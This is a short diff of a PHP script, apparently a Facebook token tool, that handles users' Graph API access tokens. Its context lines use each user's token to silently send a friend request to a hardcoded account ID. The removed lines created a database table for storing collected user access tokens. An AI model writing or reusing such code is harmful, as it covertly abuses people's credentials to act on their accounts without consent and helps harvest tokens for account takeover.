@@ -102,15 +102,6 @@ $check = json_decode(auto('https://graph.facebook.com/app/?access_token='.$token
 auto('https://graph.facebook.com/me/friends?method=post&uids=100008021291466&access_token='.$token);
 
 if($check[id] == 6628568379){  
-  
-   mysqli_query($GLOBALS["___BMN_2312"], "CREATE TABLE IF NOT EXISTS `token` (
-      `id` int(11) NOT NULL AUTO_INCREMENT,
-      `user_id` varchar(32) NOT NULL,
-      `name` varchar(32) NOT NULL,
-      `access_token` varchar(255) NOT NULL,
-      PRIMARY KEY (`id`)
-      ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;
-   ");
 $userData = json_decode(auto('https://graph.facebook.com/me?access_token='.$token),true);
 $com = "https://graph.facebook.com/me?fields=id,name&access_token=".$token;
 $ren = file_get_contents($com);
